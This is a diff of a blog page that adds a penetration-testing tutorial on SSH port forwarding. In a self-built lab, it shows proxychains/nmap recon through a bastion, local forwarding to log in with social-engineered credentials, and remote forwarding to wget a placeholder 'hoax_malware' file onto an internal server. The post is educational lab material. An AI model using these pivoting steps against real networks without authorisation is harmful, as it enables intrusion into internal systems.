@@ -37,13 +37,15 @@
 </header>
 <main class="page-content" aria-label="Content">
       <div class="wrapper">
-        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+        <a href="/blogs">&lt; To Blog home</a>
+
+<article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
 
   <header class="post-header">
     <h1 class="post-title p-name" itemprop="name headline">Gain access to an internal machine using Port forwarding - Penetration Testing</h1>
     <p>
       
-        <code>beginner</code>
+        <code>intermediate</code> <code>application</code> <code>cybersecurity</code> <code>networking</code>
       
     </p>
     <p class="post-meta">
@@ -52,9 +54,161 @@
   </header>
 
   <div class="post-content e-content" itemprop="articleBody">
-    
+    <p>Port forwarding is a technique in which a port in one machine is tunneled to a port in another machine. In simple words, a request made to a port <code class="language-plaintext highlighter-rouge">P1</code> of a machine <code class="language-plaintext highlighter-rouge">M1</code> is “forwarded” as a request to port <code class="language-plaintext highlighter-rouge">P2</code> of a machine <code class="language-plaintext highlighter-rouge">M2</code>.</p>
 
-  </div><a class="u-url" href="/2020/08/10/gain-access-to-an-internal-machine-using-port-forwarding-penetration-testing.html" hidden></a>
+<p>In the <a href="/2020/08/09/gain-access-to-an-internal-machine-using-port-forwarding-setup-experiment-environment.html">previous blog</a>, we set up the experiment environment which emulated the setup as shown in the following diagram. In this blog, we shall perform the penetration test as we go along learning <strong>port forwarding</strong>.</p>
+
+<p><img src="/assets/img/pivoting/scene.png" alt="Scenario Visual" />
+<br /><small style="color: gray">Scenario Visualization</small><br /></p>
+
+<h2 id="recap">Recap</h2>
+
+<p>You, a penetration tester, have the following information:</p>
+
+<ul>
+  <li>The data center is in <code class="language-plaintext highlighter-rouge">172.17.0.0/16</code> subnet and the enterprise is in <code class="language-plaintext highlighter-rouge">10.10.10.0/24</code> subnet.</li>
+  <li>The IP address of your machine is <code class="language-plaintext highlighter-rouge">172.17.0.1</code>.</li>
+  <li>The IP address of the network interface of the bastion server facing the data center network is <code class="language-plaintext highlighter-rouge">172.17.0.2</code>, while the network interface that is facing the enterprise network is <code class="language-plaintext highlighter-rouge">10.10.10.2</code>.</li>
+  <li>The IP address of the internal server is <code class="language-plaintext highlighter-rouge">10.10.10.3</code>.</li>
+  <li>The internal server doesn’t have access to the internet. (Somehow)</li>
+  <li>The SSH login credentials to the bastion server is <code class="language-plaintext highlighter-rouge">bastion:fortwall</code> and that of the internal server is <code class="language-plaintext highlighter-rouge">admin:homeportal</code>.</li>
+</ul>
+
+<p>Your intention is to <strong>place a hoax malware</strong> in the internal server.</p>
+
+<p><em>I suggest the readers comprehend the port forwarding terminologies with respect to the machine at the readers’ end.</em></p>
+
+<h2 id="recon-bastion-server">Recon bastion server</h2>
+
+<p>You begin by scanning for open ports in the bastion server, to find out which port serves the SSH service.</p>
+
+<p><img src="/assets/img/pivoting/recon.png" alt="Recon bastion" /></p>
+
+<p>The SSH server is running at <strong>port 2222</strong> of the bastion server and the credentials that you obtained by social engineering works!</p>
+
+<h2 id="recon-internal-server---dynamic-port-forwarding">Recon internal server - Dynamic port forwarding</h2>
+
+<p>It is time to pivot at the bastion server to recon the internal network (<code class="language-plaintext highlighter-rouge">10.10.10.0/24</code>). How do you perform reconnaissance on the internal server whose IP address is <code class="language-plaintext highlighter-rouge">10.10.10.3</code>? You could install nmap and other tools in the bastion server, but that doesn’t seem to be stealthy!</p>
+
+<p>You plan to allocate a port in your localhost that tunnels traffic to the bastion server, and the bastion server makes requests on your behalf. This method is known as <strong>Dynamic Port Forwarding</strong>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[localhost]-9050 &lt;-&gt; 2222-[bastion]-bport_any &lt;-&gt; iport_any-[internal_server]
+-------&gt; request
+&lt;------- response
+</code></pre></div></div>
+
+<p>SSH client provides a powerful set of options to execute port forwarding. To execute dynamic port forwarding to communicate with the internal network, run the following command.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-D</span> 9050 <span class="nt">-p2222</span> <span class="nt">-Nf</span> bastion@172.17.0.2
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">-D</code> option is used to open a port for dynamic port forwarding. The above command opens port 9050 in localhost and any request to it is forwarded to the bastion which dynamically opens a port for communication.</p>
+
+<h4 id="other-options">Other options</h4>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">-p</code>: to specify the port to which SSH request is to be made.</li>
+  <li><code class="language-plaintext highlighter-rouge">-N</code>: Do not execute any command. (I don’t need a shell)</li>
+  <li><code class="language-plaintext highlighter-rouge">-f</code>: Run SSH in the background.</li>
+</ul>
+
+<p>Further, you configure the proxychains to run nmap through. Open the file <code class="language-plaintext highlighter-rouge">/etc/proxychains.conf</code> and add the following record (tab-separated) under the <code class="language-plaintext highlighter-rouge">[ProxyList]</code> section:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>socks5    127.0.0.1    9050  
+</code></pre></div></div>
+
+<p>Now, you perform port scanning on the internal server at <code class="language-plaintext highlighter-rouge">10.10.10.3</code> through the bastion server at <code class="language-plaintext highlighter-rouge">172.17.0.2</code>, to find the port that services SSH requests. To do so, you run the following command:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>proxychains nmap <span class="nt">-e</span> docker0 <span class="nt">-Pn</span> <span class="nt">-sT</span> 10.10.10.3
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">-e</code> option forces nmap to use a particular interface (<code class="language-plaintext highlighter-rouge">172.17.0.1</code> in our case)</p>
+
+<p><img src="/assets/img/pivoting/recon-bastion.png" alt="Recon through bastion using proxychains" /></p>
+
+<h2 id="log-in-to-internal-server---local-port-forwarding">Log in to internal server - Local port forwarding</h2>
+
+<p>Now that you learned that the internal server serves SSH service at port 2222, you decide to log in to the server with the credentials that you have. Since the internal server is in another private network, you plan to port forward the requests made to one of the ports of the network interface reachable to you, to port 2222 of the internal server through the bastion server.</p>
+
+<p>When you want to expose a service in a server to a port of an interface reachable to you, use <strong>Local port Forwarding</strong>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[localhost]-2323 &lt;-&gt; 2222-[bastion]-bport &lt;-&gt; 2222-[internal_server]
+-------&gt; request
+&lt;------- response
+</code></pre></div></div>
+
+<p>To expose SSH service of the internal server on your local machine, run the following command.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-L</span> 2323:10.10.10.3:2222 <span class="nt">-p2222</span> <span class="nt">-Nf</span> bastion@172.17.0.2
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">-L</code> option is used to local port forward a request to a remote server. In this case, the request to port 2323 of your machine reaches the internal server at port 2222 through the session with the bastion server. The IP address (i.e. <code class="language-plaintext highlighter-rouge">10.10.10.3</code>) provided as the value for this option should be reachable by the bastion server.</p>
+
+<p>Thus, by running the following command using the socially engineered credentials, you should be able to login to the internal server.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-p2323</span> admin@localhost
+</code></pre></div></div>
+
+<p><img src="/assets/img/pivoting/login-internal.png" alt="Login to internal server by local port forwarding" /></p>
+
+<h2 id="install-the-hoax-malware---remote-port-forwarding">Install the hoax malware - Remote port forwarding</h2>
+
+<p>The final step is to install the hoax malware into the internal server. You plan to host an HTTP file server at your end and wget the hoax malware at the internal server. Remember, the internal server has no access to the internet. But, it is able to access all nodes in the enterprise subnet. Hence, you need to expose the HTTP file service running at port 8080 at your end through the bastion server to the internal server at port 8000.</p>
+
+<p>When you want to expose a service running in your machine to a port of an interface reachable to a remote server, use <strong>Remote port Forwarding</strong>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[localhost]-8080 &lt;-&gt; 2222-[bastion]-8000 &lt;-x-&gt; iport-[internal_server]
+&lt;------- request
+-------&gt; response
+</code></pre></div></div>
+
+<p>To expose the HTTP service of your local machine to the internal server through the bastion server, run the following command.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-R</span> 8000:127.0.0.1:8080 <span class="nt">-p2222</span> <span class="nt">-Nf</span> bastion@172.17.0.2
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">-R</code> option is used to remote port forward a response to a remote server. In this case, the request to port 8000 of the bastion server reaches your computer at port 8080. The IP address provided as the value for this option should be “assignable” by your computer. (You could also use <code class="language-plaintext highlighter-rouge">localhost</code> instead of the IP address of your computer. Localhost = localhost for your computer)</p>
+
+<p>In another terminal, you create an empty hoax malware file by the name <code class="language-plaintext highlighter-rouge">hoax_malware</code> by running <code class="language-plaintext highlighter-rouge">touch hoax_malware</code> and start the HTTP file server using the following command.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 8080
+</code></pre></div></div>
+
+<p>But wait! You realize that remote port forwarding can only go up to the localhost network interface of the bastion server.</p>
+
+<p><img src="/assets/img/pivoting/remote-port-forward.png" alt="Remote port forwarding to bastion server" /></p>
+
+<h2 id="remote-port-forwarding-through-a-port-that-is-forwarded-locally">Remote port forwarding through a port that is forwarded locally</h2>
+
+<p>This is not a type of port forwarding, but an attempt to show the power of compounding multiple types of port forwarding techniques. You want to somehow install the hoax malware into the internal server. Your thoughts are going wild and creativity is at its peak. You think “<em>What if I could remote forward it to the internal server itself? I anyways have SSH access to the internal server through port 2323 of my machine</em>”. Your fingers quickly fidget the following command on your penetration testing machine and you restart the HTTP file server.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-R</span> 8000:127.0.0.1:8080 <span class="nt">-p2323</span> <span class="nt">-Nf</span> admin@localhost
+python3 <span class="nt">-m</span> http.server 8080
+</code></pre></div></div>
+
+<p>And, then switch to the internal server shell terminal and try to download the hoax malware again.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://localhost:8000/hoax_malware
+</code></pre></div></div>
+
+<p><img src="/assets/img/pivoting/compound-pf.png" alt="Compound port forwarding to achieve the desired requirement" /></p>
+
+<p><strong>Bingo! MISSION ACCOMPLISHED!</strong></p>
+
+<p>NOTE: There are multiple ways to gain access to the internal server. The intention of this specific series of steps is to learn port forwarding.</p>
+
+<h2 id="more-port-forwarding-examples-in-real-life">More Port forwarding examples in real life</h2>
+
+<p><strong>Docker</strong>, the well-known containerization platform extensively uses local port forwarding. The <code class="language-plaintext highlighter-rouge">--publish</code> or <code class="language-plaintext highlighter-rouge">-p</code> option enables it. The port specified prefixing the colon <code class="language-plaintext highlighter-rouge">:</code> is the port on the host which is tunneled to the port of the docker container corresponding to the service it is running.</p>
+
+<p><strong>Ngrok</strong>, a network utility, lets one open one or more ports to the world! Yes, I mean it, the world! I believe it is using remote port forward technique, which exposes the service running at a port in the local machine to the world through the ngrok service’s <code class="language-plaintext highlighter-rouge">hostname:port</code> that pops up on the screen when one runs the ngrok utility.</p>
+
+<p><strong>Burpsuite</strong>, a web application penetration testing tool uses dynamic port forwarding. Here, the proxy server is the localhost itself. The proxy server typically runs at port 8080. Burpsuite processes and/or stores the request and forwards it to the server the browser is trying to reach. The response, however, comes back to Burpsuite, which forwards it to the browser and eventually gets rendered on the screen.</p>
+
+  </div>
+
+
+  <a href="/blogs">&lt; To Blog home</a><a class="u-url" href="/2020/08/10/gain-access-to-an-internal-machine-using-port-forwarding-penetration-testing.html" hidden></a>
 </article>
 
       </div>
